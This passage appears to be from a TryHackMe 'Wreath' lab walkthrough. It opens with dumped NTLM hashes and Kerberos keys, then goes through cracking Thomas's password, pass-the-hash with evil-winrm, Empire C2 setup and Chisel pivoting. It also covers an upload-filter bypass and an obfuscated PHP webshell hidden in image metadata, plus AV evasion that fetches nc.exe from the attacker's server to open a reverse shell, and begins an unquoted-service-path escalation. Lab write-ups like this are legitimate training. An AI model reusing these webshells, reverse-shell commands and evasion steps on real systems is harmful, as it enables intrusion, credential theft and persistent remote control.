SAMKey : f4a3c96f8149df966517ec3554632cf4

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 68b1608793104cca229de9f1dfb6fbae

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-1696O63F791Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8f7590c29ffc78998884823b1abbc05e6102a6e86a3ada9040e4f3dcb1a02955
      aes128_hmac       (4096) : 503dd1f25a0baa75791854a6cfbcd402
      des_cbc_md5       (4096) : e3915234101c6b75

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-1696O63F791Administrator
    Credentials
      des_cbc_md5       : e3915234101c6b75


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: c70854ba88fb4a9c56111facebdf3c36

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e389f51da73551518c3c2096c0720233

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1d916df8ca449782c73dbaeaa060e0785364cf17c18c7ff6c739ceb1d7fdf899
      aes128_hmac       (4096) : 33ee2dbd44efec4add81815442085ffb
      des_cbc_md5       (4096) : b6f1bac2346d9e2c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : b6f1bac2346d9e2c


RID  : 000003e9 (1001)
User : Thomas
  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 03126107c740a83797806c207553cef7

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVThomas
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 19e69e20a0be21ca1befdc0556b97733c6ac74292ab3be93515786d679de97fe
      aes128_hmac       (4096) : 1fa6575936e4baef3b69cd52ba16cc69
      des_cbc_md5       (4096) : e5add55e76751fbc
    OldCredentials
      aes256_hmac       (4096) : 9310bacdfd5d7d5a066adbb4b39bc8ad59134c3b6160d8cd0f6e89bec71d05d2
      aes128_hmac       (4096) : 959e87d2ba63409b31693e8c6d34eb55
      des_cbc_md5       (4096) : 7f16a47cef890b3b

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVThomas
    Credentials
      des_cbc_md5       : e5add55e76751fbc
    OldCredentials
      des_cbc_md5       : 7f16a47cef890b3b


RID  : 000003ea (1002)
User : THISISME :)
  Hash NTLM: 411ea6358de6105ea2afdd516fea75a3 (my insecure password)

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 20e21de55c9574fdfe2006fec61786d2

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVUSERNAME
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 5f6ab3c0b1b8a6109311045e7649bad97e0785594addbc5507570d4f65092f35
      aes128_hmac       (4096) : 2eda15319a4124c04a828d9beeaf716d
      des_cbc_md5       (4096) : 461643fb43f8ef19
    OldCredentials
      aes256_hmac       (4096) : 696c4d932144acc87ec617d2bea8423a7921d1578f88efaafd85807f5a9dd897
      aes128_hmac       (4096) : e6ff932451537becbc71c58df3310ad5
      des_cbc_md5       (4096) : 456ecb40c2267958
    OlderCredentials
      aes256_hmac       (4096) : f5a83c4dbe85d10277d65e0db2c3864b227d02cd98f7f8913306e34f4a80bb51
      aes128_hmac       (4096) : c842d4ce2c257cbe4d0a488ca76970c0
      des_cbc_md5       (4096) : f858dac1dcec04fe

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVUSERNAME
    Credentials
      des_cbc_md5       : 461643fb43f8ef19
    OldCredentials
      des_cbc_md5       : 456ecb40c2267958
```

**1) What is the Administrator password hash?**

We got this NLTM hash from our lsa dump.

**2) What is the NTLM password hash for the user "Thomas"?**

We also got this NLTM hash from the dump.

**3) What is Thomas' password?**

Since the hashes are not salted, we can try looking them up on [Crackstation](https://crackstation.net/) to check the database to see if they have already been cracked.

No luck for the admin hash, but Thomas's password has been cracked!

```
02d90eda8f6b6b06c32d5f207831101f	NTLM	i<3ruby
```

We don't really need this though since evil-winrm has a built in pass-the-hash.

```
evil-winrm -u USERNAME -H HASH -i 10.200.72.150
```

## Task 22: [Command and Control] Introduction

Now that we have established a foothold, it is time to further consolidate with a **C**ommand & **C**ontrol (C2) Framework.

This is a great resource for finding what C2 fits your needs, called [The C2 Matrix](https://www.thec2matrix.com/)

Read the intro for information on [The Empire Project](https://github.com/BC-SECURITY/Empire/)

There is also a TryHackMe room on [Empire](https://tryhackme.com/room/rppsempire).

## Task 23: [Command and Control] Empire: Installation

TryHackMe has us using Empire for this, but I would highly recommend using this free network to test out other frameworks.

I created a /opt/C2 folder for this, but you can put it anywhere you want.

```
sudo git clone https://github.com/BC-SECURITY/Empire/
cd Empire && sudo ./setup/install.sh
```

Now that it is installed, we can access the framework.

```
sudo ./empire
```

This is a step you can skip if you would like to stick with the CLI, but I am going to test out starkiller.

```
sudo apt install starkiller
```

Now if we run Empire headless and background it, we can access the collaborative GUI, starkiller.

```
sudo ./empire --headless &
```

Starkiller is an Electron app that connects to the REST API exposed by Empire when using the option --rest or --headless.

Now we need to sign into the REST API. It defaults to https://localhost:1337 with default credentials empireadmin;password123.

## Task 24: [Command and Control] Empire: Overview

Read about Powershell Empire.

Main takeaways are:

* **Listeners** listen for a connection to a stager for exploitation.
* **Stagers** are payloads similar to msfvenom that are generated by Empire to connect with a listener.
* **Agents** are like a [Metasploit](https://www.metasploit.com/) session made by a stager connecting to a listener.
* **Modules** work with the agent for further exploitation such as dumping credentials.
* **Plugins** allow for customization and extension of the functionality of the framework.

**1) Can we get an agent back from the git server directly (Aye/Nay)?**
No, we cannot because we will have to set up a special kind of listener due to the way Empire handles Pivoting.

## Task 25: Empire: Listeners

First, we must select a listener. We will be using a http listener (most common). This is the CLI method.

```
uselistener http
info
```

We also list the options to see what this listener requires.

The syntax to set these is identical to Metasploit.

```
set OPTION VALUE
```

Let's go ahead and set some options to deploy an agent on the web server which we can connect directly to.

```
set Name Webserver
set Host Tun0-IP
set Port 18903
```

Now that we have all the required options set, we can execute our listener.

This will run in the background, so we can use back to return to the Empire menu.

We can view this active listener with **listeners**.

To kill this we do **kill LISTENER_NAME**.

Now, we can do this with starkiller.

* Click create listener.
* Set the type to http.
* Set the Name, host, and port.
* Click submit.

## Task 26: [Command and Control] Empire: Stagers

Empire CLI:

```
usestager - lists available stagers
```

We will be using **multi/bash**. However, **multi/launcher** is usually a good option.

```
usestager multi/bash
info
```

We must set the options as before.

* Set the listener to the name of the listener we created in starkiller.
* Execute.
* Retrieve the stager from the /tmp directory.
* Save the stager in your exploits directory for Wreath.

To create a stager in starkiller, it is pretty much identical.

* Click Generate Stager
* Set Listener to the one previously made.
* Copy the stager to the clipboard.

You can decode this script with base64 if you want to see what it does.

## Task 27: [Command and Control] Empire: Agents

It's time to put our stager and listener together to get an agent on the Webserver.

Let's read through the script.

* The first line is the shebang, telling the shell to run as bash.
* The second section is the payload.
* The final 2 lines are the post processing commands that delete itself and exit.

We can take the payload, copy it, and execute it with our ssh session on the production web server.

```
(Empire: stager/multi/bash) > 
[*] Sending PYTHON stager (stage 1) to 10.200.72.200                                                                                                         
[*] Agent LUUP1KYM from 10.200.72.200 posted valid Python PUB key
[*] New agent LUUP1KYM checked in
[+] Initial agent LUUP1KYM from 10.200.72.200 now active (Slack)
[*] Sending agent (stage 2) to LUUP1KYM at 10.200.72.200
[!] strip_python_comments is deprecated and should not be used
(Empire: stager/multi/bash) > agents

[*] Active agents:
                                                                                                                                                             
 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 LUUP1KYM py 10.200.72.200   prod-serv         *root                   python3            2842   5/0.0    2021-03-25 20:55:45  Webserver       
```

Now that we have established an agent, we can interact with it in the CLI or starkiller.

```
(Empire: agents) > interact LUUP1KYM
(Empire: LUUP1KYM) > help

Agent Commands
==============
agents            Jump to the agents menu.
back              Go back a menu.
cat               View the contents of a file
cd                Change an agent's active directory
clear             Clear out agent tasking.
creds             Display/return credentials from the database.
dirlist           Tasks an agent to store the contents of a directory in the database.
download          Task an agent to download a file into the C2.
exit              Task agent to exit.
help              Displays the help menu or syntax for particular commands.
info              Display information about this agent
jobs              Return jobs or kill a running job.
killdate          Get or set an agent's killdate (01/01/2016).
list              Lists all active agents (or listeners).
listeners         Jump to the listeners menu.
loadpymodule      Import zip file containing a .py module or package with an __init__.py
lostlimit         Task an agent to display change the limit on lost agent detection
main              Go back to the main menu.
osx_screenshot    Use the python-mss module to take a screenshot, and save the image to the server. Not opsec safe
python            Task an agent to run a Python command.
pythonscript      Load and execute a python script
removerepo        Remove a repo
rename            Rename the agent.
resource          Read and execute a list of Empire commands from a file.
searchmodule      Search Empire module names/descriptions.
shell             Task an agent to use a shell command.
sleep             Task an agent to 'sleep interval [jitter]'
sysinfo           Task an agent to get system information.
upload            Task the C2 to upload a file into an agent.
usemodule         Use an Empire Python module.
viewrepo          View the contents of a repo. if none is specified, all files will be returned
workinghours      Get or set an agent's working hours (9:00-17:00).
```

**1) Using the help command for guidance: in Empire CLI, how would we run the whoami command inside an agent?**

You can just enter **whoami** or **shell whoami**

## Task 28: [Command and Control] Empire: Hop Listeners

Since Empire agents can't be proxied with a socat relay or alternative method, we must use a Hop Listener.

We will be using a **http_hop** listener.

```
uselistener http_hop
info
```

We are interested in:

* **RedirectListener** - forwards received agents like a relay.

```
set RedirectListener Gitserver
```

* **Host** - IP of the compromised web server (.200)

```
set Host 10.200.72.200
```

* **Port** - Pick a port above 150000

```
set Port 22903
```

Before we execute, we must make another listener like before connecting to the same port that this hop can connect to.

```
HTTP[S] Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  Name              True        Gitserv                          Name for the listener.
  Host              True        http://Tun0-IP:22903         Hostname/IP for staging.
  BindIP            True        0.0.0.0                          The IP to bind to on the control server.
  Port              True        22903                            Port for the listener.
  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.
  StagingKey        True        YJ=mQxdi<zB1.%6lP]cr{A0@?yEwhD3O Staging key for initial agent negotiation.
  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).
  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).
  DefaultLostLimit  True        60                               Number of missed checkins before exiting
  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile for the agent.
                                process.php|Mozilla/5.0 (Windows
                                NT 6.1; WOW64; Trident/7.0;
                                rv:11.0) like Gecko
  CertPath          False                                        Certificate path for https listeners.
  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).
  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).
  Headers           True        Server:Microsoft-IIS/7.5         Headers for the control server.
  Cookie            False       gcOzVStJjORlwcvt                 Custom Cookie Name
  StagerURI         False                                        URI for the stager. Must use /download/. Example: /download/stager.php
  UserAgent         False       default                          User-agent string to use for the staging request (default, none, or other).
  Proxy             False       default                          Proxy to use for request (default, none, or other).
  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use for request (default, none, or other).
  SlackURL          False                                        Your Slack Incoming Webhook URL to communicate with your Slack instance.
```

Execute the listener, and then the http_hop to go with it.

```
[*] Starting listener 'http_hop'
[*] Hop redirector written to /tmp/http_hop//admin/get.php . Place this file on the redirect server.
[*] Hop redirector written to /tmp/http_hop//news.php . Place this file on the redirect server.
[*] Hop redirector written to /tmp/http_hop//login/process.php . Place this file on the redirect server.
[+] Listener successfully started!
```

## Task 29: [Command and Control] Git Server

Now that we have our **http_hop** listener started, we must generate a stager.

We can use a **multi/launcher** for this.

* Set the listener name to the hop (Gitserv).
* Execute
* Save the payload in a file somewhere to use later.
* Create a directory with your ssh session in tmp on .200 (/tmp/hop-USERNAME).
* Zip the files on your VM under /tmp/http_hop.
* Start a python http server.

```
python3 -m http.server 80
```

* Curl the zip file from the ssh session into your directory you made on .200.

```
[root@prod-serv hop-USERNAME]# curl tun0-IP/hop.zip -o hop.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2961  100  2961    0     0  14100      0 --:--:-- --:--:-- --:--:-- 14100

```

Unzip the file and serve the files on the port we made for our listener.

```
[root@prod-serv hop-USERNAME]# unzip hop.zip
Archive:  hop.zip
   creating: admin/
  inflating: admin/get.php           
   creating: login/
  inflating: login/process.php       
  inflating: news.php                
[root@prod-serv hop-USERNAME]# ls
admin  hop.zip  login  news.php
[root@prod-serv hop-USERNAME]# php -S 0.0.0.0:22903 &>/dev/null &
[1] 3332
[root@prod-serv hop-USERNAME]# ss -tulwn | grep 22903
tcp     LISTEN   0        128              0.0.0.0:22903          0.0.0.0:* 
```

Open up the port in the firewall:

```
firewall-cmd --zone=public --add-port 22903/tcp
```

Now we can open up BurpSuite and execute our payload with the webshell we uploaded earlier.

## Task 30: [Command and Control] Empire: Modules

Now we can start to look into some of the modules.

```
usemodule
searchmodule
```

Since we already have root, we won't need to use any of these privilege escalationg modules, but they are good to know.

A useful builtin module is winPEAS.

## Task 31: [Command and Control] Conclusion

Read the conclusion.

## Task 32: [Personal PC] Enumeration

Now we are moving onto the final device, and will need to work on Anti-virus evasion.

First, we must understand the scope of the final target.

Luckily for us, we have evil-winrm to help with enumeration.

We can use the upload/download options to upload to .150 along with the Empire Port Scanning script.

```
upload LOCAL_FILEPATH REMOTE_FILEPATH
download REMOTE_FILEPATH LOCAL_FILEPATH
```

However, evil-winrm actually happens to have a -s option in the help menu that will allow us to select a PowerShell script from our local directory.

```
evil-winrm -u USERNAME  -H HASH -i IP -s /path/script.ps1
```

The path to the Empire scripts if installed in opt are located at (/opt/Empire/data/module_source/situational_awareness/network/).

Note: You can also grab this tool in the zipfile included in the beginning.

Alright, let's go ahead and pass-the-hash signing in with evil-winrm.

```
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.72.150 -s /opt/Empire/data/module_source/situational_awareness/network/                   

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan.ps1
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-Help Invoke-Portscan

NAME
    Invoke-Portscan

SYNOPSIS
    Simple portscan module

    PowerSploit Function: Invoke-Portscan
    Author: Rich Lundeen (http://webstersProdigy.net)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None


SYNTAX
    Invoke-Portscan -Hosts <String[]> [-ExcludeHosts <String>] [-Ports <String>] [-PortFile <String>] [-TopPorts <String>] [-ExcludedPorts <String>] [-Open] [-SkipDiscovery] [-PingOnly] [-DiscoveryPorts <String>] [-Threads <Int32>] [-nHosts
    <Int32>] [-Timeout <Int32>] [-SleepTimer <Int32>] [-SyncFreq <Int32>] [-T <Int32>] [-GrepOut <String>] [-XmlOut <String>] [-ReadableOut <String>] [-AllformatsOut <String>] [-noProgressMeter] [-quiet] [-ForceOverwrite] [<CommonParameters>]

    Invoke-Portscan -HostFile <String> [-ExcludeHosts <String>] [-Ports <String>] [-PortFile <String>] [-TopPorts <String>] [-ExcludedPorts <String>] [-Open] [-SkipDiscovery] [-PingOnly] [-DiscoveryPorts <String>] [-Threads <Int32>] [-nHosts
    <Int32>] [-Timeout <Int32>] [-SleepTimer <Int32>] [-SyncFreq <Int32>] [-T <Int32>] [-GrepOut <String>] [-XmlOut <String>] [-ReadableOut <String>] [-AllformatsOut <String>] [-noProgressMeter] [-quiet] [-ForceOverwrite] [<CommonParameters>]


DESCRIPTION
    Does a simple port scan using regular sockets, based (pretty) loosely on nmap


RELATED LINKS
    http://webstersprodigy.net

REMARKS
    To see the examples, type: "get-help Invoke-Portscan -examples".
    For more information, type: "get-help Invoke-Portscan -detailed".
    For technical information, type: "get-help Invoke-Portscan -full".
    For online help, type: "get-help Invoke-Portscan -online"
```

**1) Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)**

Now that we have the portscan module invoked, let's run a portscan on the last device in the network.

```
Invoke-Portscan -Hosts 10.200.72.100 -TopPorts 50
Hostname      : 10.200.72.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 5900, 993...}
finishTime    : 3/25/2021 10:05:03 PM
```

## Task 33: [Personal PC] Pivoting

Now that we found 2 ports open, we can look to pivot.

* 80 - webserver
* 3389 - RDP

Without credentials, the RDP port won't be of much use. So let's look into the webserver.

First, we must pivot from the web server.

For this, I will be using Chisel.

We can start by setting up a port in the Windows firewall (on .150) to allow the forward connection to be made.

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> netsh advfirewall firewall add rule name="Chisel-USERNAME" dir=in action=allow protocol=tcp localport=26743
Ok.
```

Now, we can upload the Windows Chisel binary to .150 using evil-winrm.

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload chisel-USERNAME
Info: Uploading chisel-USERNAME.exe to C:\Users\Administrator\Documents\chisel-USERNAME.exe

                                                             
Data: 11758248 bytes of 11758248 bytes copied

Info: Upload successful!
```

Now that we have uploaded Chisel, we can go and setup the chisel server.

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> ./chisel-USERNAME server -p 26743 --socks5
chisel-USERNAME : 2021/03/25 22:27:06 server: Fingerprint t5oA1Uzn8STucetN8VLufFwV0HS45X7aoxoCH8QcJc8=
    + CategoryInfo          : NotSpecified: (2021/03/25 22:2...X7aoxoCH8QcJc8=:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2021/03/25 22:27:06 server: Listening on http://0.0.0.0:267432021/03/25 22:29:12 server: session#1: Client version (0.0.0-src) differs from server version (1.7.3)
```

Now we must reach back from our VM using client. I installed chisel using **apt install chisel**.

```
chisel client 10.200.72.150:26743 9090:socks
2021/03/25 18:29:09 client: Connecting to ws://10.200.72.150:26743
2021/03/25 18:29:09 client: tun: proxy#127.0.0.1:9090=>socks: Listening
2021/03/25 18:29:10 client: Connected (Latency 104.446563ms)
```

Finally, we can go ahead and set up our FoxyProxy to begin attacking the http site on .100.

* Proxy Type: SOCKS5
* Proxy IP address: 127.0.0.1
* Port: 9090
* Enable and navigate to 10.200.72.100

Now, we have access to his Development website on .100.

**1) Using the Wappalyzer browser extension ([Firefox](https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/) | [Chrome](https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en) or an alternative method, identify the server-side Programming language (including the version number) used on the website.**

Since we are on Firefox, we will install the extension.

Re-load the page and Wappalyzer will tell us that the programming language used is PHP 7.4.11.

Now that we see the site is a copy of the one running on the webserver, we can try to get the repo from the local admin access we currently have on the git server and re-assemble it locally.

Let's look around the Git Server with WinRM.

```
*Evil-WinRM* PS C:\GitStack> cd repositories
*Evil-WinRM* PS C:\GitStack\repositories> ls


    Directory: C:\GitStack\repositories


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2021   7:05 PM                Website.git


*Evil-WinRM* PS C:\GitStack\repositories> 
```

We're in luck, we found the Website.git. Let's download it using evil-winrm's download feature.

```
*Evil-WinRM* PS C:\GitStack\repositories> download Website.git
Info: Downloading C:\GitStack\repositories\Website.git to Website.git

                                                             
Info: Download successful!
```

This took a few minutes, and does not display a progress bar like the upload does... so give it awhile.

Navigate to the Website.git folder and rename the C:\GitStack\repositories\Website.git folder to .git

Now we can install GitTools:

```
git clone https://github.com/internetwache/GitTools
```

This contains three tools:

* **Dumper** - Used to download an exposed .git directory from a site. We can skip this, since we already stole the repo from the server.
* **Extractor** - Takes a local .git directory to recreate it in a readable format.
* **Finder** - Searches the internet for sites with .git directories. This tool seems like we won't be using it at all.

However, **Extractor** is perfect for what we want. Let's run it on the parent directory of the .git folder we renamed earlier.

```
./extractor.sh /home/kali/Desktop/CTF/TryHackMe/Wreath/Website.git/ /home/kali/Desktop/CTF/TryHackMe/Wreath/RepoExtract/
```

Now we should have recreated the repository and can start to perform code analysis.

Navigating to the RepoExtract directory, we can see 3 commits. Each containing a commit-meta.txt that is formatted.

In the commits we can see three messages left.

```
tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
author twreath <me@thomaswreath.thm> 1604849458 +0000
committer twreath <me@thomaswreath.thm> 1604849458 +0000

Static Website Commit

tree 03f072e22c2f4b74480fcfb0eb31c8e624001b6e
parent 70dde80cc19ec76704567996738894828f4ee895
author twreath <me@thomaswreath.thm> 1608592351 +0000
committer twreath <me@thomaswreath.thm> 1608592351 +0000

Initial Commit for the back-end

tree c4726fef596741220267e2b1e014024b93fced78

parent 82dfc97bec0d7582d485d9031c09abcb5c6b18f2

author twreath <me@thomaswreath.thm> 1609614315 +0000

committer twreath <me@thomaswreath.thm> 1609614315 +0000

Updated the filter
```

We can see commit (70dde80cc19ec76704567996738894828f4ee895) has no parent, so we can check the other commit's to find the commit order:

1. 70dde80cc19ec76704567996738894828f4ee895
1. 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
1. 345ac8b236064b431fa43f53d91c98c4834ef8f3

Note: Timestamps can also be used, however they can be tampered with.

## Task 35: [Personal PC] Website Code Analysis

Let's look into commit **2-345ac8b236064b431fa43f53d91c98c4834ef8f3** where the filter was updated.

We can open the terminal and use find to look for PHP files.

```
find . -name "*.php"
./resources/index.php
```

Read through the **index.php** file.

**1) What does Thomas have to phone Mrs Walker about?**

```
<!DOCTYPE html>
<html lang=en>
        <!-- ToDo:
                  - Finish the styling: it looks awful
                  - Get Ruby more food. Greedy animal is going through it too fast
                  - Upgrade the filter on this page. Can't rely on basic auth for everything
                  - Phone Mrs Walker about the neighbourhood watch meetings
        -->
        <head>  
```

**2) Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?**

This is also in the ToDo list comment.

**3) Which extensions are accepted (comma separated, no spaces or quotes)?**

```
$size = getimagesize($_FILES["file"]["tmp_name"]);
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
    header("location: ./?msg=Fail");
    die();
}
```

Reviewing the code, we can see that we might be able to implement a filter bypass on this file-upload point.

* The first line checks to see if the file is an image.
* The second line is an if statement that checks two conditions. Since it includes an OR modifier, both will have to be met or it will fail.
* First condition checks the size.
* The second condition has two functions, **in_array()** and **explode()**
* **explode()** splits a string for the file at each '.', meaning it is probably a file-extension filter

Since it grabs the second string [1], we can hide our extension after the first fake extension.

Example: image.jpeg.php : [1] = .jpeg

* Looking at the other function now **in_array**, we can see that it checks a whitelist to see if the result of the explode method is *not* in an array ($goodExts).

This does not fix the bypass that we found, so we can take advantage of the filter.

```
$goodExts = ["jpg", "jpeg", "png", "gif"];
```

Now, let's find where the file will be uploaded to:

```php
$target = "uploads/".basename($_FILES["file"]["name"]);
...
move_uploaded_file($_FILES["file"]["tmp_name"], $target);
```

## Task 36: [Personal PC] Exploit PoC

Let's navigate to the /resources directory that we found the index.php in.

We can see our uploaded payload will be moved into the uploads directory.

Unfortunately we're met with a login authentication box.

Let's try the credentials we compromised from Thomas earlier because it says: "Welcome Thomas!"

Thomas;i<3ruby worked so we will not have to attempt with the other username we observed for Thomas.
twreath;i<3ruby

### Success!!! We got into the upload page.

Let's go ahead and upload our innocent.jpeg.php file!

Unfortunately, we still need to deal with the getimagesize() function.

Since it checks for attributes that only an image would have, we need to upload an image file that contains a PHP webshell.

Let's find any image and rename it to "**test-USERNAME.jpeg.php**".

Since we know there is Anti-virus (AV) and not what kind it is, we will want to create a harmless php file that we can test without setting off an AV.

```
<?php echo "<pre>Test Payload</pre>"; die();?>
```

This little PHP test should be enough to see if the payload will work without setting off AV.

To force the php into the image we will be using exiftool.

```
sudo apt install exiftool
```

Now all we have to do is add our PHP in as the comment because the server will read the extension in as PHP.

```
exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-USERNAME.jpeg.php
```

Click browse, and switch all supported types to all files so you can select your PHP test file and click upload it.

### We have a successful test and just need to figure out how to bypass the AV!

## Task 37: [AV Evasion] Introduction

Read through the lesson on AV evasion.

**1) Which category of evasion covers uploading a file to the storage on the target before executing it?**

This is On-Disk evasion method because it is stored on the device and not In-Memory.

**2) What does AMSI stand for?**

You can find this in the reading. It was a feature implemented by Microsoft that scans scripts as they enter memory.

**3) Which category of evasion does AMSI affect?**

## Task 38: [AV Evasion] AV Detection Methods

Read about static and dynamic/heuristic/behavioral detection.

Answer the questions with the reading.

## Task 39: [AV Evasion] PHP Payload Obfuscation

Since we know that our test payload worked, we can now create a real payload that will execute the cmd.

```php
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

This is a longer version than a possible one-liner that can be used.

```php
<?php system($_GET["cmd"]);?>
```

If we're obfuscating it though, ours will become a one-liner anyway and this one will have a different hash than the common one-liner.

Now we can use this [tool](https://www.gaijin.at/en/tools/php-obfuscator) to obfuscate our payload with all of the available options.

Now we are given our obfuscated payload.

```php
<?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>
```

However, since it will be interpreted in bash we need to escape the dollar signs that might be read as variables.

```php
<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>
```

Let's go ahead and use exiftool again but this time, embed our final payload into the comments.

```
exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-USERNAME.jpeg.php
```

Finally, upload the shell!

**1) What is the Host Name of the target?**

Now, let's test it out using the wreath GET parameter.

```
http://10.200.72.100/resources/uploads/shell-USERNAME.jpeg.php?wreath=systeminfo
```

We get the answer to #1 from this command.

**2) What is our current username (include the domain in this)?**

We can run a whoami through the webshell to get this.

## Task 40 [AV Evasion]: Compiling Netcat & Reverse Shell!

Now that we have a user, let's attempt to reverse the connection and get a reverse shell to do some privilege escalation.

Now we need to do some research to find a netcat binary that wont get caught by defender.

Other options include [Veil Framework](https://www.veil-framework.com/) or [shellter](https://www.shellterproject.com/).

Let's clone the intox33's repository and see if it will pass the Windows Defender AV.

```
git clone https://github.com/int0x33/nc.exe/
```

Start up a webserver on your attacking machine.

```
sudo python3 -m http.server 80
```

Now we have to decide how to upload the netcat.

* Powershell (risky with AMSI).
* File upload point to upload a unrestricted PHP file uploader.
* Look for curl or certutil on the target.

Let's start with certutil and see if it works.

***1) What output do you get when running the command: certutil.exe?**

```
CertUtil: -dump command completed successfully
```

I am going to be using cURL for this though because I feel it will be better for AV evasion.

Start up a listener, upload netcat, and then run the payload.

```
nc -lvnp 16702
```

Make sure to escape the slashes here so that they are passed in with the command.

```
curl http://tun0-ip/nc.exe -o c:\\windows\\temp\\nc-USERNAME.exe
```

Finally, execute the payload.

```ps
powershell.exe c:\\windows\\temp\\nc-USERNAME.exe tun0-IP 16702 -e cmd.exe
```

### Win! We now have a reverse shell.

I went back and tested this with a msfvenom payload to see what it would be like if the shell was taken out by AV.

## Task 41: [AV Evasion] Enumeration

Unfortunately, Thomas did not give himself root privileges on his own PC. So we will have to escalate to system.

Defender would catch WinPEAS, but there are [obfuscated and batch versions](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/) that would bypass.

Let's go ahead and check what privileges he does have to see if we can take advantage of any.

```
whoami /priv
```

If we check the groups, we see Thomas is not even a local admin.

```
whoami /groups
```

**1) **[Research]** One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits -- which privilege is this?**

I know what this is from past CTFs, but you can read about this [here](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege).

Now we can further enumerate by looking for default services that could be vulnerable.

```
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```

We cut out the core services because they are unlikely to have any vulnerabilities unless outdated.

**2) Read through them, paying particular attention to the PathName column. Notice that one of the paths does not have quotation marks around it. What is the Name (second column from the left) of this service?**

We end up finding the **SystemExplorerHelpService**.

**3) Is the service running as the local system account (Aye/Nay)?**

We can check this.

```
sc qc SystemExplorerHelpService
```

Great, now let's cross our fingers and check if we can write to it.

```ps
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```

We can see that we have full control of this directory! It looks like every user has access to this.

Now we can exploit unquoted service paths, DLL hijack, or replace the executable with our own payload.

Since this is a network, let's use the unquoted services path.

Note: I also went on and got an obfuscated version of WinPEAS on the device, there's a LOT of other vulnerabilities.

Thomas needs to patch this device.

## Task 42: [AV Evasion] Privilege Escalation

Let's go ahead and exploit the unquoted service path.

We first want to install Mono.

```
sudo apt install mono-devel
```

Open the **wrapper.cs** in a text editor and add the necessary imports to start new processes (netcat).

```cs
import System;
import System.Diagnostics;
```

Initialize a namespace and the class.

```cs
namespace Wrapper{
    class Program{
        static void Main(){
            //Our code will go here!
        }
    }
}
```

Let's now add the code for netcat using the function Main().

```cs
Process proc = new Process();
ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-USERNAME.exe", "tun0-IP LISTENINGPORT -e cmd.exe");
```

